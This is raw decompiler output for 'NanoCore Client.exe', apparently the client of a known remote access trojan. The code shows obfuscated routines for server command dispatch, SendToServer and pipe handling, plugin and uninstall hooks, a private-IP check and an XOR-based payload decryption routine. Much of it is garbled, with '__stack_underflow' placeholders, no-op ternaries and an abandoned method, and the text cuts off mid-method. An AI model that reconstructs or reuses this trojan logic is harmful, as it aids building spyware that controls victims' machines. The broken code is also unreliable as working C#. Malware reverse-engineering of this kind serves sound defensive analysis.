// native disrobe CIL->C# decompilation (no runtime, no external tool)
// module: NanoCore Client.exe

// #=q_5hmJXim2EG1abw3Kju8nMffXDIbl5na4zXqclsRK_s=
public static bool #=qd7RJPnCy4YddvoQeTJhlwA==(System.Net.IPAddress arg1)
{
    byte[] local0;

    if (arg1.AddressFamily != 2)
    {
        return false;
    }
    if (8 != 0)
    {
        local0 = __stack_underflow;
    }
    if (local0[0] != 10)
    {
        if ((local0[0] != 172 || local0[1] <= 15) || local0[1] >= 32)
        {
            if (local0[0] != 192 || local0[1] != 168)
            {
                return false;
            }
        }
    }
    return true;
}
// #=q_jQLaNdtSDa6ovA0VGw50w==
private static void .cctor()
{
    if (3 != 0)
    {
        #=qZFVU$VkNPSWYii2AVQe6c6mwAUd10Tgqkl1$K5gZz9Y= = __stack_underflow;
    }
    if (1 != 0)
    {
        #=qa9HOmSrK7mjt1ZxVRncCgFoJUA6N3DmB1Rc$YUfcSKM= = __stack_underflow;
    }
    if (0 == 0)
    {
        #=qkWUjAoA_6r2E7qo6NAGuIBq3iKikqBJbioTC25CcZQY= = __stack_underflow;
    }
    #=qAM4ZJ3aDwBm_a3IkqHxLmjdKzHIQbFeE9thLHux2o6g= = new #=qChPTKc$8xcHrcle7anHYNe0wH_TweGkex2nGe9n8WDs=<#=qlsj4Kl0M6SYgZMJLZ$QkSw==>();
    #=qDJ4yS7fCDfIiEVFkwyEE6G3$$73HwRgy2_eKZUkxaSo= = new #=qChPTKc$8xcHrcle7anHYNe0wH_TweGkex2nGe9n8WDs=<#=qObBSq08BLhHK8B6pYQSLOw==>();
    return;
}
// #=q_jQLaNdtSDa6ovA0VGw50w==
internal static #=qWsrg06gTzsE5hhHu57fJFw== #=qonMVJIv_P7bZ29oJ_eSSxA==()
{
    return #=qZFVU$VkNPSWYii2AVQe6c6mwAUd10Tgqkl1$K5gZz9Y=.#=qbpvfREN3OwaXBj6J3WBAim$AQyJ99fz1ef01qn6kVrs=();
}
// #=q_jQLaNdtSDa6ovA0VGw50w==
internal static #=qtussAh$DpHFmu7sm9TXJyZsrjeJ6Xm9c2y22v4wQG2s= #=qVVQJ$z9bl7kHgfvJohZnMPofzhiFJ4f4yMGK7Tpp6xg=()
{
    return #=qa9HOmSrK7mjt1ZxVRncCgFoJUA6N3DmB1Rc$YUfcSKM=.#=qbpvfREN3OwaXBj6J3WBAim$AQyJ99fz1ef01qn6kVrs=();
}
// #=q_jQLaNdtSDa6ovA0VGw50w==
internal static Microsoft.VisualBasic.ApplicationServices.User #=qbYAYBaHwcEbf1CaxjAi1bw==()
{
    return #=qkWUjAoA_6r2E7qo6NAGuIBq3iKikqBJbioTC25CcZQY=.#=qbpvfREN3OwaXBj6J3WBAim$AQyJ99fz1ef01qn6kVrs=();
}
// #=q_jQLaNdtSDa6ovA0VGw50w==
internal static #=qlsj4Kl0M6SYgZMJLZ$QkSw== #=qqROT7DfncW7strhZvp0iRQ==()
{
    return #=qAM4ZJ3aDwBm_a3IkqHxLmjdKzHIQbFeE9thLHux2o6g=.#=qbpvfREN3OwaXBj6J3WBAim$AQyJ99fz1ef01qn6kVrs=();
}
// #=q_jQLaNdtSDa6ovA0VGw50w==
internal static #=qObBSq08BLhHK8B6pYQSLOw== #=qjcSlrUNMLgvZWN$58FXdrl22$0OjCpoqksNsslRtIFE=()
{
    return #=qDJ4yS7fCDfIiEVFkwyEE6G3$$73HwRgy2_eKZUkxaSo=.#=qbpvfREN3OwaXBj6J3WBAim$AQyJ99fz1ef01qn6kVrs=();
}
// #=qChPTKc$8xcHrcle7anHYNe0wH_TweGkex2nGe9n8WDs=
public void .ctor()
{
    ((8 != 0 ? this : this)).ctor();
    return;
}
// #=qChPTKc$8xcHrcle7anHYNe0wH_TweGkex2nGe9n8WDs=
internal #=qJEtGIBRUjtEusa67yMyqWQ== #=qbpvfREN3OwaXBj6J3WBAim$AQyJ99fz1ef01qn6kVrs=()
{
    if (!(#=qRLk0VFphuSTh16H1MGZUv_HwKU6b1$OQZ0l10zUjPKU= is not null))
    {
        if (3 != 0)
        {
            #=qRLk0VFphuSTh16H1MGZUv_HwKU6b1$OQZ0l10zUjPKU= = __stack_underflow;
        }
    }
    return #=qRLk0VFphuSTh16H1MGZUv_HwKU6b1$OQZ0l10zUjPKU=;
}
// #=qlsj4Kl0M6SYgZMJLZ$QkSw==
public void .ctor()
{
    ((-1 != 0 ? this : this)).ctor();
    return;
}
// #=qlsj4Kl0M6SYgZMJLZ$QkSw==
public ClientLoaderForm #=qbzig1$2CwLluEJt5uPtpgqPx5y_2S$GoPgJP36N8bTE=()
{
    if (1 != 0)
    {
        __stack_underflow.#=qeKiN0Pwa0MwkK0uB$Ook97TrMQC$LNj1jgF6xTuSA2g= = __stack_underflow;
    }
    return this.#=qeKiN0Pwa0MwkK0uB$Ook97TrMQC$LNj1jgF6xTuSA2g=;
}
// #=qlsj4Kl0M6SYgZMJLZ$QkSw==
public void #=q60UcvJzzgao2Rv_stV3rQhhxCdm95L1Gb83mKGH1VxQ=(ClientLoaderForm arg1)
{
    if (!(((6 != 0 ? arg1 : arg1)) != ((5 != 0 ? this : this)).#=qeKiN0Pwa0MwkK0uB$Ook97TrMQC$LNj1jgF6xTuSA2g=))
    {
        return;
    }
    if (!((4 != 0 ? arg1 : arg1)))
    {
        this.#=qQLqXliLS$ujl108DGV7$zv9jo8WyYr7oxBJvAgzllyk=(ref this.#=qeKiN0Pwa0MwkK0uB$Ook97TrMQC$LNj1jgF6xTuSA2g=);
        return;
    }
    throw new System.ArgumentException(#=q00kXQ$0a$SV9DIgRtf4NWQ==(516956373));
}
// #=qlsj4Kl0M6SYgZMJLZ$QkSw==
private static T #=qyc0YQPNqWwZHkgNDV8lyIQfgMkEbGZtyDsLzhYmFp8w=<T>(T arg1)
{
    T local0;
    string local1;
    System.Reflection.TargetInvocationException local2;
    string[] local3;

    if (!(arg1 is null || !(!arg1.IsDisposed)))
    {
        return arg1;
    }
    if (#=qvA35ZDPTM3VgF89oJb9AmWFE4pqnIDYGjeV5H4uvblU= == null)
    {
        if (-1 != 0)
        {
            #=qvA35ZDPTM3VgF89oJb9AmWFE4pqnIDYGjeV5H4uvblU= = __stack_underflow;
        }
    }
    else
    {
        if (!(!#=qvA35ZDPTM3VgF89oJb9AmWFE4pqnIDYGjeV5H4uvblU=.ContainsKey(typeof(T))))
        {
            throw new System.InvalidOperationException(Microsoft.VisualBasic.CompilerServices.Utils.GetResourceString(#=q00kXQ$0a$SV9DIgRtf4NWQ==(516956415), new System.String[0]));
        }
    }
    #=qvA35ZDPTM3VgF89oJb9AmWFE4pqnIDYGjeV5H4uvblU=.Add(typeof(T), null);
    try
    {
        if (5 != 0)
        {
            local0 = __stack_underflow;
        }
    }
    catch (System.Reflection.TargetInvocationException ex) when ((local2.InnerException == null) == false)
    {
    }
    finally
    {
    }
}
// #=qlsj4Kl0M6SYgZMJLZ$QkSw==
private void #=qQLqXliLS$ujl108DGV7$zv9jo8WyYr7oxBJvAgzllyk=<T>(ref T arg1)
{
    T local0;

    ((8 != 0 ? arg1 : arg1)).Dispose();
    local0 = default(T);
    *((4 != 0 ? arg1 : arg1)) = (7 != 0 ? local0 : local0);
    return;
}
// #=qlsj4Kl0M6SYgZMJLZ$QkSw==
public bool Equals(object arg1)
{
    return ((8 != 0 ? this : this)).Equals(System.Runtime.CompilerServices.RuntimeHelpers.GetObjectValue((0 == 0 ? arg1 : arg1)));
}
// #=qlsj4Kl0M6SYgZMJLZ$QkSw==
public int GetHashCode()
{
    return ((1 != 0 ? this : this)).GetHashCode();
}
// #=qlsj4Kl0M6SYgZMJLZ$QkSw==
internal System.Type #=qJZLeQthAfpiCw0QvZb7htA==()
{
    return typeof(#=qlsj4Kl0M6SYgZMJLZ$QkSw==);
}
// #=qlsj4Kl0M6SYgZMJLZ$QkSw==
public string ToString()
{
    return ((3 != 0 ? this : this)).ToString();
}
// #=qObBSq08BLhHK8B6pYQSLOw==
public void .ctor()
{
    ((1 != 0 ? this : this)).ctor();
    return;
}
// #=qObBSq08BLhHK8B6pYQSLOw==
public bool Equals(object arg1)
{
    return ((1 != 0 ? this : this)).Equals(System.Runtime.CompilerServices.RuntimeHelpers.GetObjectValue((7 != 0 ? arg1 : arg1)));
}
// #=qObBSq08BLhHK8B6pYQSLOw==
public int GetHashCode()
{
    return ((-1 != 0 ? this : this)).GetHashCode();
}
// #=qObBSq08BLhHK8B6pYQSLOw==
internal System.Type #=qAkkjpY6IHZssIsQ9hAxzTw==()
{
    return typeof(#=qObBSq08BLhHK8B6pYQSLOw==);
}
// #=qObBSq08BLhHK8B6pYQSLOw==
public string ToString()
{
    return ((4 != 0 ? this : this)).ToString();
}
// #=qObBSq08BLhHK8B6pYQSLOw==
private static T #=q2LHISsr6oVwPjyrC2AFTD2_CdAouK60pDkoTs0efRSU=<T>(T arg1)
{
    if ((5 == 0 ? arg1 : arg1))
    {
        return System.Activator.CreateInstance<T>();
    }
    return (-1 != 0 ? arg1 : arg1);
}
// #=qObBSq08BLhHK8B6pYQSLOw==
private void #=q4d$NdpGCMcL3TaMlT9EW69FacIvNnqDPMFNisgGhmsY=<T>(ref T arg1)
{
    T local0;

    local0 = default(T);
    *((7 != 0 ? arg1 : arg1)) = (0 == 0 ? local0 : local0);
    return;
}
// #=q48p8EJcbwRuSJ9efJfzTZ7uyOBVlFQpnFVv30w93EJA=
public static void #=q0zLeEY98tybLc8FS6iVEWjGp4MNZxETphcH7ohzBXuY=(#=qxe_BfLLMHqYa_KBeLsRfpw== arg1)
{
    switch ((&arg1).#=qKi0KrAcAGUOMcS5S$2tJyg==)
    {
        case 0:
            #=qVEEdpD96A48uRzPJT7G_w60gIZo4tH1_e21GoRWPFm8=((&arg1).#=qL_Q_RdUm_wJ7VeVwUqRXbA==);
            break;
        case 1:
            #=q$sTc1AZMnHRC7q_PL2hWs4JIEJoo88_IAFcWtrdNt$4=((&arg1).#=qL_Q_RdUm_wJ7VeVwUqRXbA==);
            break;
        case 2:
            #=qNsyg$dsR$GJkSvK2TftGTNPuC8S809j_UmmfNnXTTOo=((&arg1).#=qL_Q_RdUm_wJ7VeVwUqRXbA==);
            break;
        case 3:
            #=q9iu_XWrg9WTOw3hVDQcP8ZcABJLoMYtAY0HfRbaBN24=((&arg1).#=qL_Q_RdUm_wJ7VeVwUqRXbA==);
            break;
        default:
            break;
    }
    return;
}
// #=q48p8EJcbwRuSJ9efJfzTZ7uyOBVlFQpnFVv30w93EJA=
public static void #=qVEEdpD96A48uRzPJT7G_w60gIZo4tH1_e21GoRWPFm8=(object[] arg1)
{
    // disrobe: unstructured control flow has no legal target scope: goto IL_005B has no legal target scope; the compiler-emitted plumbing below is kept verbatim as the only static evidence
    // byte[] local0;
    // bool local1;
    // if (8 != 0)
    // {
    // #=qehEpCuPIxZRbHczlt$dAWi4yWi9o1_noSvuo$Wzvtyo= = __stack_underflow;
    // }
    // if (3 != 0)
    // {
    // #=q1tLM5Gk001IDETj3RhJ2ESaIo2XgaV2vMWhqISqSHy8= = __stack_underflow;
    // }
    // if (#=q79YE7jk$t8I7uIUVykHcVA==.Count != 0)
    // {
    // #=qpQiSeXaCc6qGNX49vDbcMYyzv_UpV$YoUyrH0l6FW6Q=(#=q79YE7jk$t8I7uIUVykHcVA==.Dequeue());
    // }
    // if (8 != 0)
    // {
    // local0 = __stack_underflow;
    // }
    // if (#=qmbdg4P9$2ouafwS8nEs4lA== == null)
    // {
    // IL_005B:;
    // local1 = true;
    // }
    // else
    // {
    // if (#=qtNbB44E34Ui_i5yJYQ5ntw==(#=qN9Enun6Rlq30xNdBjhzY0A==, local0))
    // {
    // local1 = false;
    // }
    // else
    // {
    // goto IL_005B;
    // }
    // }
    // #=qU0vjurWIhbfq4$RoGXKKVfTj5MJBenZeu2wAtoCJAJY=(local1);
    // return;
    throw new System.NotSupportedException("disrobe: unstructured control flow has no legal target scope");
}
// #=q48p8EJcbwRuSJ9efJfzTZ7uyOBVlFQpnFVv30w93EJA=
public static void #=q$sTc1AZMnHRC7q_PL2hWs4JIEJoo88_IAFcWtrdNt$4=(object[] arg1)
{
    System.DateTime local0;
    byte[] local1;

    if (2 != 0)
    {
        local0 = __stack_underflow;
    }
    if (3 != 0)
    {
        local1 = __stack_underflow;
    }
    if (8 != 0)
    {
        #=qJLXxSZzWSVDQjBBC8RxpqVbwxFaxTu3ygaLrjLvlmTw= = __stack_underflow;
    }
    #=qmbdg4P9$2ouafwS8nEs4lA== = local1;
    #=qN9Enun6Rlq30xNdBjhzY0A== = #=q8d8q1KZbTCKTAZreko1Lug==(#=qmbdg4P9$2ouafwS8nEs4lA==);
    #=qvPYkN4Wli543LScsy6rh$bZ0bDIN0tYd5zlNUibOEKfBRc13v6NIDRtsxPOZzKpX();
    #=qo_N0HkUaMUQFRCOsgr2ciQEl_IzgJy64oQzCRnN$Qy4=();
    return;
}
// #=q48p8EJcbwRuSJ9efJfzTZ7uyOBVlFQpnFVv30w93EJA=
public static void #=qNsyg$dsR$GJkSvK2TftGTNPuC8S809j_UmmfNnXTTOo=(object[] arg1)
{
    System.Collections.Generic.List<System.Guid> local0;
    System.Collections.Generic.List<object> local1;
    bool local2;
    int local3;
    #=qbbSw65PC$nto6DJiWxTawg== local4;
    byte[] local5;
    System.Guid local6;
    #=qbbSw65PC$nto6DJiWxTawg== local7;
    System.Exception local8;
    System.Exception local9;
    int local10;
    System.Collections.Generic.List<#=qbbSw65PC$nto6DJiWxTawg==>.Enumerator local11;

    try
    {
        if (7 != 0)
        {
            local1 = __stack_underflow;
        }
    }
    catch (System.Exception ex)
    {
    }
    return;
}
// #=q48p8EJcbwRuSJ9efJfzTZ7uyOBVlFQpnFVv30w93EJA=
public static void #=q9iu_XWrg9WTOw3hVDQcP8ZcABJLoMYtAY0HfRbaBN24=(object[] arg1)
{
    System.Collections.Generic.List<#=qbbSw65PC$nto6DJiWxTawg==> local0;
    int local1;
    #=qbbSw65PC$nto6DJiWxTawg== local2;
    #=qbbSw65PC$nto6DJiWxTawg== local3;
    int local4;
    System.Collections.Generic.List<#=qbbSw65PC$nto6DJiWxTawg==>.Enumerator local5;

    if (3 != 0)
    {
        local0 = __stack_underflow;
    }
    if (4 != 0)
    {
        local4 = __stack_underflow;
    }
    if (0 == 0)
    {
        local1 = __stack_underflow;
    }
    while (local1 <= local4)
    {
        local2 = new #=qbbSw65PC$nto6DJiWxTawg==();
        local2.#=q7Kx5VWqZvUxLZ2L5c7WH8A== = *arg1[local1];
        local2.#=qR0v_DeAkzbUr6_Md5tN4PQ== = *arg1[local1 + 1];
        local2.#=q0U3u45cUl83Kicjfx0RmVA== = (String)arg1[local1 + 2];
        local2.#=qOmCJCQ4xVqqqlvNEZD66Wg== = *arg1[local1 + 3];
        local2.#=qamR76KZ1klLpv5s7oSbjxA== = (byte[])arg1[local1 + 4];
        local2.#=qLYpbsprg$ymVLeNEwEpYlA== = #=q8d8q1KZbTCKTAZreko1Lug==(local2.#=qamR76KZ1klLpv5s7oSbjxA==);
        #=q0yJsLo0aFpSu9ky8R9f$lw==.Add(local2);
        local0.Add(local2);
        if (!(!local2.#=qOmCJCQ4xVqqqlvNEZD66Wg==))
        {
            #=qehEpCuPIxZRbHczlt$dAWi4yWi9o1_noSvuo$Wzvtyo= = true;
            local1 = local1 + 5;
            continue;
        }
        local1 = local1 + 5;
        continue;
    }
    if (!(!#=qehEpCuPIxZRbHczlt$dAWi4yWi9o1_noSvuo$Wzvtyo=))
    {
        #=q5OunwTi_tYTGCTkAtZ8rARxlhmXbFcAf_e1GiEt$FEA=();
    }
    if (!(!#=q23tIFHA2cbwzlg6YDYhwLkXCJGgIhllZCGmc4pRC8rI=))
    {
        #=qKtJTKEkNf2mJVHcZzSW8iQIcsBglzcJJOkX7V_uB55w=();
        return;
    }
    #=q5j3wvJXlnrGmRnKUHr_1SQ==(#=q00kXQ$0a$SV9DIgRtf4NWQ==(516958981));
    try
    {
        local5 = local0.GetEnumerator();
        while (local5.MoveNext())
        {
            local3 = local5.Current;
            #=qCeF2tfSXulrE0bbyPxU$1ik7Jf3avSO4FKBmKNH9QLg=(local3.#=qamR76KZ1klLpv5s7oSbjxA==, local3);
            continue;
        }
        #=qkxzumuLbzy2O2XsBlM3j$g==(#=q6Xi08r0$lOOnXtoBHhfMuQ==, true, (CommandType)1, 3, new System.Object[0]);
        return;
    }
    finally
    {
    }
}
// #=q48p8EJcbwRuSJ9efJfzTZ7uyOBVlFQpnFVv30w93EJA=
public static void #=qU0vjurWIhbfq4$RoGXKKVfTj5MJBenZeu2wAtoCJAJY=(bool arg1)
{
    object[] local0;

    if (5 != 0)
    {
        local0 = __stack_underflow;
    }
    local0[0] = arg1;
    #=qkxzumuLbzy2O2XsBlM3j$g==(__stack_underflow, __stack_underflow, __stack_underflow, __stack_underflow, local0);
    return;
}
// #=q48p8EJcbwRuSJ9efJfzTZ7uyOBVlFQpnFVv30w93EJA=
public static void #=qo_N0HkUaMUQFRCOsgr2ciQEl_IzgJy64oQzCRnN$Qy4=()
{
    #=qkxzumuLbzy2O2XsBlM3j$g==(#=q6Xi08r0$lOOnXtoBHhfMuQ==, true, (CommandType)1, 1, new System.Object[0]);
    return;
}
// #=q4KMIX0AcXAdYuUiSKvyy9Q==
public void .ctor()
{
    ((0 == 0 ? this : this)).ctor();
    return;
}
// #=q4KMIX0AcXAdYuUiSKvyy9Q==
public void #=qI5Vms5JVXaVkwalJFV3L6w==(System.Guid arg1, string arg2, #=qbOmsEb0zGpdZukI0D4Idug== arg3)
{
    if (6 != 0)
    {
        __stack_underflow.#=qHtBOSXbLfhirIdzL218uOQ== = __stack_underflow;
    }
    if (1 != 0)
    {
        __stack_underflow.#=qKxYY$jYG8_7mT_7R0n5jfw== = __stack_underflow;
    }
    if (1 != 0)
    {
        __stack_underflow.#=qYKspnFhL3rrV8a6zSvXJWA== = __stack_underflow;
    }
    return;
}
// #=q9c$dxNln4J1nxxC7UNVnfSKvSgKS421$zTS6z9ahlusddEno_MZclU7Qbfc$Fyw5
public static byte[] #=qwTOYF_qEkI0dXowKJYtI6A==(byte[] arg1, byte[] arg2)
{
    byte local0;
    int local1;
    byte local2;
    uint local3;
    ushort local4;
    int local5;
    byte local6;
    byte local7;

    if (0 == 0)
    {
        local0 = __stack_underflow;
    }
    if (0 == 0)
    {
        local1 = __stack_underflow;
    }
    if (1 != 0)
    {
        local2 = __stack_underflow;
    }
    local3 = (arg1[0] | (arg1[2] << 8)) + (local2 << 3);
    local4 = 0;
    local5 = 0;
    while (local5 < local1)
    {
        if ((local5 & 1) == 0)
        {
            local3 = (local3 * 214013) + 2531011;
            local4 = (ushort)(local3 >>> 16);
            local6 = (byte)local4;
            local4 = (ushort)(local4 >> 8);
            local7 = arg2[local5];
            arg2[local5] = (byte)(((local7 ^ local0) ^ (local2 + 3)) ^ local6);
            local2 = local7;
            local5 = local5 + 1;
            continue;
        }
        local6 = (byte)local4;
        local4 = (ushort)(local4 >> 8);
        local7 = arg2[local5];
        arg2[local5] = (byte)(((local7 ^ local0) ^ (local2 + 3)) ^ local6);
        local2 = local7;
        local5 = local5 + 1;
        continue;
    }
    return arg2;
}
// #=qA$TQXn2i$KwpdqxTX6vvVw==
public void .ctor(#=qbOmsEb0zGpdZukI0D4Idug== arg1)
{
    if (3 != 0)
    {
        __stack_underflow.#=q_0gCRmXint4znUKVJR_bzg== = __stack_underflow;
    }
    return;
}
// #=qA$TQXn2i$KwpdqxTX6vvVw==
public NanoCore.IClientNameObjectCollection get_Variables()
{
    return #=qQrBlfreeUYUGyN3hPOorGA==;
}
// #=qA$TQXn2i$KwpdqxTX6vvVw==
public NanoCore.IClientNameObjectCollection get_ClientSettings()
{
    return #=qs4p7qYamgHyRCYZsTKM03Q==;
}
// #=qA$TQXn2i$KwpdqxTX6vvVw==
public NanoCore.IClientReadOnlyNameObjectCollection get_BuilderSettings()
{
    return #=qCJD3QzeNpOG7t7hUNPqgxgwPhMjv4aui2ikN049iz28=;
}
// #=qbbSw65PC$nto6DJiWxTawg==
public void .ctor()
{
    ((5 != 0 ? this : this)).ctor();
    return;
}
// #=qbOmsEb0zGpdZukI0D4Idug==
public void .ctor(System.Guid arg1, string arg2)
{
    if (8 != 0)
    {
        __stack_underflow.#=qFlfDskRbjMOXZPvSw2W2UA== = __stack_underflow;
    }
    if (8 != 0)
    {
        __stack_underflow.#=qgCcrNFC0iLB8hKTy5iNnsw== = __stack_underflow;
    }
    return;
}
// #=qbOmsEb0zGpdZukI0D4Idug==
public void #=q3cm0QwDyNYr2y$xvkCk9bGbohRfuMuxkahGwLy466GA=(string arg1)
{
    if (!(((7 != 0 ? this : this)).#=quFACL_$e$cUEIexpzPXS7w== != null))
    {
        return;
    }
    ((-1 != 0 ? this : this)).#=quFACL_$e$cUEIexpzPXS7w==.VariableChanged((0 == 0 ? arg1 : arg1));
    return;
}
// #=qbOmsEb0zGpdZukI0D4Idug==
public void #=qay$wDBdxvh$MBWrC9YMhC_f55kIvkv7I_BjPu_7Ajsw=(string arg1)
{
    if (!(((4 != 0 ? this : this)).#=quFACL_$e$cUEIexpzPXS7w== != null))
    {
        return;
    }
    ((6 != 0 ? this : this)).#=quFACL_$e$cUEIexpzPXS7w==.ClientSettingChanged((4 != 0 ? arg1 : arg1));
    return;
}
// #=qbOmsEb0zGpdZukI0D4Idug==
public void #=qP9qYgJs5_O2GP2pI$ho4ZSa8wQkwNQEBMg8VjNRrUWE=()
{
    if (!(((5 != 0 ? this : this)).#=q5WjY_m3ubVFfbJuyu7GMxA== != null))
    {
        return;
    }
    ((4 != 0 ? this : this)).#=q5WjY_m3ubVFfbJuyu7GMxA==.BuildingHostCache();
    return;
}
// #=qbOmsEb0zGpdZukI0D4Idug==
public void #=qbwvWShVSL8DgrXXfPQ9kNmpf6pmcj6q57bPfcsBp938=(string arg1, ushort arg2)
{
    if (!(((8 != 0 ? this : this)).#=q5WjY_m3ubVFfbJuyu7GMxA== != null))
    {
        return;
    }
    ((1 != 0 ? this : this)).#=q5WjY_m3ubVFfbJuyu7GMxA==.ConnectionFailed((-1 != 0 ? arg1 : arg1), arg2);
    return;
}
// #=qbOmsEb0zGpdZukI0D4Idug==
public void #=qqn0Pbku3c3j14idd7rNOJmIbi4WueHDQGNjxpToWe9w=(bool arg1)
{
    if (!(((8 != 0 ? this : this)).#=q5WjY_m3ubVFfbJuyu7GMxA== != null))
    {
        return;
    }
    ((-1 != 0 ? this : this)).#=q5WjY_m3ubVFfbJuyu7GMxA==.ConnectionStateChanged((2 != 0 ? arg1 : arg1));
    return;
}
// #=qbOmsEb0zGpdZukI0D4Idug==
public void #=qsA8D04owIGYHILF6yPa43A==(string arg1)
{
    if (!(((8 != 0 ? this : this)).#=q5WjY_m3ubVFfbJuyu7GMxA== != null))
    {
        return;
    }
    ((-1 != 0 ? this : this)).#=q5WjY_m3ubVFfbJuyu7GMxA==.PipeCreated((7 != 0 ? arg1 : arg1));
    return;
}
// #=qbOmsEb0zGpdZukI0D4Idug==
public void #=q4kB_KjL2oo8adT7lfnt6ew==(string arg1)
{
    if (!(((8 != 0 ? this : this)).#=q5WjY_m3ubVFfbJuyu7GMxA== != null))
    {
        return;
    }
    ((3 != 0 ? this : this)).#=q5WjY_m3ubVFfbJuyu7GMxA==.PipeClosed((8 != 0 ? arg1 : arg1));
    return;
}
// #=qbOmsEb0zGpdZukI0D4Idug==
public void #=qBk9t7p9S5R095rOkFdE8GQ==(string arg1, object[] arg2)
{
    if (!(((-1 != 0 ? this : this)).#=q5WjY_m3ubVFfbJuyu7GMxA== != null))
    {
        return;
    }
    ((1 != 0 ? this : this)).#=q5WjY_m3ubVFfbJuyu7GMxA==.ReadPacket((3 != 0 ? arg1 : arg1), arg2);
    return;
}
// #=qbOmsEb0zGpdZukI0D4Idug==
public void #=q98hMbgVf4fBR3MKeaM4uQI$YRLQdIr1biYYF5369cW8=()
{
    if (!(((3 != 0 ? this : this)).#=qG2DPieaEKCS$j6T6yTf$qg== != null))
    {
        return;
    }
    ((6 != 0 ? this : this)).#=qG2DPieaEKCS$j6T6yTf$qg==.PluginUninstalling();
    return;
}
// #=qbOmsEb0zGpdZukI0D4Idug==
public void #=qCy_StxaanQioOSGQ9LimCF9_Wy9AMBNKclrIIUI0AWs=()
{
    if (!(((4 != 0 ? this : this)).#=qG2DPieaEKCS$j6T6yTf$qg== != null))
    {
        return;
    }
    ((6 != 0 ? this : this)).#=qG2DPieaEKCS$j6T6yTf$qg==.ClientUninstalling();
    return;
}
// #=qCQ9vY8iVniiFr_C0wuoMFHQgjJIll0MjoDGXuPo1hYk=
public void .ctor(#=qbOmsEb0zGpdZukI0D4Idug== arg1)
{
    if (-1 != 0)
    {
        __stack_underflow.#=qhSKaq9YW4A_ja0UC7Difmw== = __stack_underflow;
    }
    return;
}
// #=qCQ9vY8iVniiFr_C0wuoMFHQgjJIll0MjoDGXuPo1hYk=
public bool get_Connected()
{
    return #=q6Xi08r0$lOOnXtoBHhfMuQ==.#=qvvhgGCgMlZiK63M2bP1Kcg==();
}
// #=qCQ9vY8iVniiFr_C0wuoMFHQgjJIll0MjoDGXuPo1hYk=
public void ClosePipe(string arg1)
{
    if (!#=qalo3zYdlWWh$dYSx9JnNrw==.ContainsKey((8 == 0 ? arg1 : arg1)))
    {
        #=qalo3zYdlWWh$dYSx9JnNrw==[(0 == 0 ? arg1 : arg1)].#=quOBOxPeAl_kjKKx$REI6dA==();
    }
    return;
}
// #=qCQ9vY8iVniiFr_C0wuoMFHQgjJIll0MjoDGXuPo1hYk=
public bool PipeExists(string arg1)
{
    return #=qalo3zYdlWWh$dYSx9JnNrw==.ContainsKey((-1 != 0 ? arg1 : arg1));
}
// #=qCQ9vY8iVniiFr_C0wuoMFHQgjJIll0MjoDGXuPo1hYk=
public void Disconnect()
{
    #=q6Xi08r0$lOOnXtoBHhfMuQ==.#=quOBOxPeAl_kjKKx$REI6dA==();
    return;
}
// #=qCQ9vY8iVniiFr_C0wuoMFHQgjJIll0MjoDGXuPo1hYk=
public void SendToServer(string arg1, bool arg2, object[] arg3)
{
    Client local0;

    if (arg3 == null)
    {
        #=qhg8oaKg1xx$HC$DKnlbXQpibwH2HXqMGSlGv30vEUsU=(this.#=qhSKaq9YW4A_ja0UC7Difmw==, new System.Exception(#=q00kXQ$0a$SV9DIgRtf4NWQ==(516959374)), #=q00kXQ$0a$SV9DIgRtf4NWQ==(516959319));
        return;
    }
    if (5 != 0)
    {
        local0 = __stack_underflow;
    }
    if (System.String.IsNullOrEmpty(arg1))
    {
        #=qIrsTmpVUMRgxokIHlpGfmLtKeqxo7vQsjSkKUKFpH4k=(local0, arg2, (CommandType)0, 4, this.#=qhSKaq9YW4A_ja0UC7Difmw==.#=qFlfDskRbjMOXZPvSw2W2UA==, arg3);
    }
    else
    {
        if (!(!#=qalo3zYdlWWh$dYSx9JnNrw==.ContainsKey(arg1)))
        {
            if (0 == 0)
            {
                local0 = __stack_underflow;
            }
        }
    }
    return;
}
// #=qCQ9vY8iVniiFr_C0wuoMFHQgjJIll0MjoDGXuPo1hYk=
public void AddHostEntry(string arg1)
{
    #=qHU4s4cJ8BUWy$MQH9LPGxTniDgLcWFlt1CmhZ7PNRWA=((5 != 0 ? arg1 : arg1));
    return;
}
// #=qCQ9vY8iVniiFr_C0wuoMFHQgjJIll0MjoDGXuPo1hYk=
public void RebuildHostCache()
{
    #=qzRcQ_b8FoTlpKT_BObsgBl2bj71wU5HcYdpIIgiTJ5c=();
    return;
}
// #=qcrlhteALkcfYnKFH$UWw$HzZqj8gdN8_KwUKIC_ywUo=
private static void .cctor()
{
    System.Type[] local0;

    if (8 != 0)
    {
        local0 = __stack_underflow;
    }
    local0[0] = typeof(IClientNetwork);
    local0[1] = typeof(IClientData);
    local0[2] = typeof(IClientApp);
    if (5 != 0)
    {
        #=qUbRtqAPcSxRMI51YgNXGZ9omJvV5BvuqBNocgi7xl6Q= = __stack_underflow;
    }
    if (1 != 0)
    {
        local0 = __stack_underflow;
    }
    local0[0] = typeof(IClientDataHost);
    local0[1] = typeof(IClientNetworkHost);
    local0[2] = typeof(IClientUIHost);
    local0[3] = typeof(IClientLoggingHost);
    local0[4] = typeof(IClientAppHost);
    #=q9M64o5ghSlB001vxhTt2kVIQeNtcHtzTvRgoYr2$PVs= = local0;
    return;
}
// #=qEnv9WsExz6baZJKRUDupw9eEQbgJVjj69NjcsJ7hrBk=
public static void #=q9rPQSTp$UBZiTGc7mKlh7h1QvRgfs0p_mQAaIRjRIsQ=(string arg1, int arg2, long arg3)
{
    byte[] local0;
    long local1;
    System.IO.FileStream local2;
    int local3;

    if (4 != 0)
    {
        local2 = __stack_underflow;
    }
    if (5 != 0)
    {
        local0 = __stack_underflow;
    }
    while (true)
    {
        if (0 == 0)
        {
            local3 = __stack_underflow;
        }
    }
    local2.Close();
    return;
}
// #=qEnv9WsExz6baZJKRUDupw9eEQbgJVjj69NjcsJ7hrBk=
public static #=qzTUdhpx_l8oNrXik8Q6a51kZkIp$waiEMbjMOU1bFOc= #=qYQagvH1k4NeWsCidwFRb$sQTZXPGouROQfmoImiPGDo=(string arg1)
{
    #=qzTUdhpx_l8oNrXik8Q6a51kZkIp$waiEMbjMOU1bFOc= local0;
    #=qzTUdhpx_l8oNrXik8Q6a51kZkIp$waiEMbjMOU1bFOc= local1;
    System.IO.FileInfo local2;
    System.IO.FileStream local3;
    #=qzTUdhpx_l8oNrXik8Q6a51kZkIp$waiEMbjMOU1bFOc= local4;

    local0 = default(#=qzTUdhpx_l8oNrXik8Q6a51kZkIp$waiEMbjMOU1bFOc=);
    try
    {
        if (7 != 0)
        {
            local2 = __stack_underflow;
        }
    }
    catch (System.Exception ex)
    {
